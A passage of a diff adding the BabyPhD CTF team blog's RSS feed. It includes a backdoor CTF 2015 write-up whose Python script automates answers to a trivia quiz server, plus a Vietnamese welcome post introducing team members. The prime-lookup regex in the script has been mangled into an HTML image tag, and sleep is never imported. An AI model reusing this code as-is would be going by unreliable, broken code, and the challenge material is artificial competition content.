+	output = Popen(["python", "sqrd.py", "qr"], stdout=PIPE).communicate()[0]
+	print i, output.strip()
+	sock.send(output.strip())</pre>
+<p>Convert the QR to binary only and use Strong QR to decode. After 50 submissions we've got the flag.</p>
+<h1>backdoor CTF 2015: <a href="https://backdoor.sdslabs.co/challenges/RAPIDFIRE">RAPIDFIRE</a></h1>
+<p><strong>Category:</strong> Misc <strong>Points:</strong> 500 <strong>Author:</strong> <a href="https://backdoor.sdslabs.co/users/apsdehal">Amanpreet Singh</a> <strong>Difficulty:</strong> TODO <strong>Solves:</strong> 0 <strong>Description:</strong></p>
+<ul class="task-list">
+<li><a href="https://backdoor.sdslabs.co/challenges/RAPIDFIRE">https://backdoor.sdslabs.co/challenges/RAPIDFIRE</a></li>
+</ul>
+<blockquote><p>I am enjoying it really. Are you? <code>nc hack.bckdr.in 8007</code>. Submit the SHA-256 hash of the flag obtained.</p></blockquote>
+<p>Chuymichxinhdep: Just use a brilliant source code from gaylord.</p>
+<pre class="lang:python decode:true ">import socket, hashlib, time, requests
+from geopy import GoogleV3
+import re
+import shelve
+import omdb
+
+host = '128.199.107.60'
+port = 8008
+rep_countrycode = False
+
+def fib(n):
+    i = h = 1
+    j = k = 0
+    while (n &gt; 0) :
+        if (n%2 == 1) : # when n is odd
+            t = j*h
+            j = i*h + j*k + t
+            i = i*k + t
+        t = h*h
+        h = 2*k*h + t
+        k = k*k + t
+        n = int(n/2)
+    return j
+
+def get_country(place_name):
+    gapi = shelve.open('googly_cache', writeback=True)
+    try:
+        wat = place_name.encode('base64')
+    except UnicodeEncodeError:
+        wat = u' '.join(place_name).encode('utf-8').strip().encode('base64')
+    if (wat in gapi):
+        print('[*] Found in shelf')
+        loc = gapi[wat]
+    else:
+        print('[*] Request from GGAPI')
+        loc = geolocator.geocode(place_name).raw
+        gapi[wat] = loc
+        gapi.sync()
+    gapi.close()
+    for comp in loc['address_components']:
+        if 'country' in comp['types']:
+            if rep_countrycode:
+                return comp['short_name'] # TODO: not short_name but something else
+            else:
+                return comp['long_name']
+
+def get_release(movie_name):
+    gapi = shelve.open('moviee_cache', writeback=True)
+    try:
+        wat = movie_name.encode('base64')
+    except UnicodeEncodeError:
+        wat = u' '.join(movie_name).encode('utf-8').strip().encode('base64')
+    if (wat in gapi):
+        print('[*] Found in shelf')
+        loc = gapi[wat]
+    else:
+        print('[*] Request from OMDB')
+        s = omdb.title(movie_name)
+        loc = s['year']
+        gapi[wat] = loc
+        gapi.sync()
+    gapi.close()
+    return loc
+    
+def read_until(wat):
+    buf = ''
+    while not (wat in buf):
+        buf += sock.recv(1)
+    return buf
+    
+def read_for_fun(sz):
+    d = ''
+    while (sz &gt; 0):
+        tmp = sock.recv(sz)
+        sz -= len(tmp)
+        d += tmp
+    return d
+
+# init connection
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect((host, port))
+geolocator = GoogleV3()
+pii = requests.get('http://www.angio.net/pi/digits/pi1000000.txt').text
+# read &amp; answer
+while True:
+    s = sock.recv(8192)
+    if ('code is in CAPS' in s): rep_countrycode = True
+    if (s == ''): sleep(10)
+    print(s)
+    n = 'wat'
+    res = n
+    if ('sum' in s):
+        n = int(re.findall(r'first\ (\d+)\ ', s)[0])
+        if ('odd' in s):
+            res = n * n
+        elif ('fibonacci' in s):
+            res = fib(n+2) - 1
+        elif ('natural number' in s):
+            res = (n * (n + 1) // 2)
+        res = str(res)
+    elif ('prime' in s):
+        n = int(re.findall(r'the\ (\d+)(st|nd|rd|th)', s)[0][0]) + 1
+        n = str(n)
+        page = requests.get('http://numbersofprime.com/prime/' + n)
+        res = re.findall(r'<p style='text-align:center;'><span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_7d2876bab7cecac2e7cfb6f0c86dd091.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none;' class='tex' alt="" data-recalc-dims="1" /></span></p>', page.text)[1]
+        res = res.replace(',', '')
+        res = res.strip()
+    elif ('md5' in s):
+        n = re.findall(r'of\ (.*)\n', s)[0]
+        res = hashlib.md5(n).hexdigest()
+    elif ('pi' in s):
+        n = int(re.findall(r'the\ (\d+)(st|nd|rd|th)', s)[0][0])
+        res = pii[n+1]
+    elif ('fibonacci' in s):
+        n = int(re.findall(r'the\ (\d+)(st|nd|rd|th)', s)[0][0])
+        res = str(fib(n))
+    elif ('binary' in s):
+        n = int(re.findall(r'of\ (\d+)\ in', s)[0])
+        res = bin(n)[2:]
+    elif ('country' in s):
+        n = re.findall(r'of\ (.*)\n', s)[0]
+        res = get_country(n)
+    elif ('release year' in s):
+        n = re.findall(r'of\ (.*)\n', s)[0]
+        res = get_release(n)
+    print '[*] n = ', n
+    print '[*] res = ', res
+    sock.sendall(res+'\n')</pre>
+<p>&nbsp;</p>
+<p>I added pycountry to get the alpha-2 code of country. After 199 submissions we will get the flag. Not a fun challange because of slow server and too many stupid questions.</p>
+<p>-chuymichxinhdep.</p>
+<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/04/phd.png?ssl=1"><img data-attachment-id="326" data-permalink="https://babyphd.net/2015/04/03/backdoorctf-writeup/phd/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/04/phd.png?fit=1350%2C696&amp;ssl=1" data-orig-size="1350,696" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="phd" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/04/phd.png?fit=300%2C155&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/04/phd.png?fit=604%2C311&amp;ssl=1" class="aligncenter wp-image-326 size-full" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/04/phd.png?resize=604%2C311&#038;ssl=1" alt="phd" width="604" height="311" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/04/phd.png?w=1350&amp;ssl=1 1350w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/04/phd.png?resize=300%2C155&amp;ssl=1 300w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/04/phd.png?resize=1024%2C528&amp;ssl=1 1024w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/04/phd.png?w=1208&amp;ssl=1 1208w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p>BabyPhD.</p>
+]]></content:encoded>
+							<wfw:commentRss>https://babyphd.net/2015/04/03/backdoorctf-writeup/feed/</wfw:commentRss>
+		<slash:comments>1</slash:comments>
+						<post-id xmlns="com-wordpress:feed-additions:1">324</post-id>	</item>
+		<item>
+		<title>Welcome to BabyPhD!</title>
+		<link>https://babyphd.net/2015/01/01/welcome-to-babyphd/</link>
+				<pubDate>Thu, 01 Jan 2015 14:15:26 +0000</pubDate>
+		<dc:creator><![CDATA[chuymichxinhdep]]></dc:creator>
+				<category><![CDATA[Uncategorized]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=203</guid>
+				<description><![CDATA[Đôi lúc tôi hay một mình Tự hỏi rằng đời này có bao nhiêu ngày vui* &#160; Các trang blog CTF nói chung thường có hiện tượng bong bóng như kiểu nhà đất Việt Nam thập niên hai ngàn. Ất min ban đầu mới lập cũng chịu khó đầu tư. Dần dần cơm áo gạo tiền và đủ thứ &#8230; <a href="https://babyphd.net/2015/01/01/welcome-to-babyphd/" class="more-link">Continue reading <span class="screen-reader-text">Welcome to BabyPhD!</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<p style="text-align: right;"><em>Đôi lúc tôi hay một mình</em></p>
+<p style="text-align: right;"><em>Tự hỏi rằng đời này có bao nhiêu ngày vui*</em></p>
+<p>&nbsp;</p>
+<p>Các trang blog CTF nói chung thường có hiện tượng bong bóng như kiểu nhà đất Việt Nam thập niên hai ngàn. Ất min ban đầu mới lập cũng chịu khó đầu tư. Dần dần cơm áo gạo tiền và đủ thứ vớ vẩn sinh chán. Thêm nữa hậu duệ kém không kế tục được sự nghiệp nên hỏng cả. Thời còn mông muội, dân tình vào chơi ngõ hầu muốn được cái gì đó nhưng dần dà blog CTF đã không đáp ứng được với thời cuộc. Ngay đến cả thằng đầu xỏ ất min cũng bỏ mẹ qua facebook cầm kiếm nhựa chém nhau. Ấy vậy mà BabyPhD chúng tôi vẫn mạnh dạn mở blog CTF writeup. Ở xã hội thấy thịnh thì phù mà thấy suy thì nhổ có được những thánh thần rơi rớt lại những tính túy cuối cùng của các tay <em>hacker</em> mũ trắng thật là tự thấy mừng cho cộng đồng IT Việt vậy.</p>
+<p>Để mở đầu cho chương trình nghệ thuật tấn công đến đâu viết lại tới đấy, chia sẻ chút kiến thức còm cõi cho đồng đạo security, chúng tôi xin hân hạnh khai trương blog BabyPhD với các thành viên trụ cột sau:</p>
+<ul>
+<li>chuymichxinhdep: đã xinh đẹp lại còn học thức &lt;3</li>
+<li>yeuchimse: lời ít tình chi thít</li>
+<li>peternguyen: anh hùng thời loạn</li>
+<li>justcallmedude: gay kín không tên</li>
+<li>antibkav: loại già có vợ nên luôn là thành viên bỏ đi của team, vớt vát cho nó phong phú</li>
+<li>huyna: hiệp sĩ thoắt ẩn thoắt hiện, chỉ thấy xi nhan khi có bài pwn</li>
+<li>chim: geohot của nhóm</li>
+</ul>
+<p>(Một vài thành viên khác xin giấu tên, số thành viên liên tục cập nhật nếu các bạn apply tại  <a href="https://www.facebook.com/babyphd.team">đây</a>)</p>
+<p>&nbsp;</p>
+<p>Xin chào thân ái và quyết thắng</p>
+<p>- Chụy Mích</p>
+<p>*Đời có bao nhiêu ngày vui - st:Châu Đăng Khoa</p>
+]]></content:encoded>
+									<post-id xmlns="com-wordpress:feed-additions:1">203</post-id>	</item>
+	</channel>
+</rss>
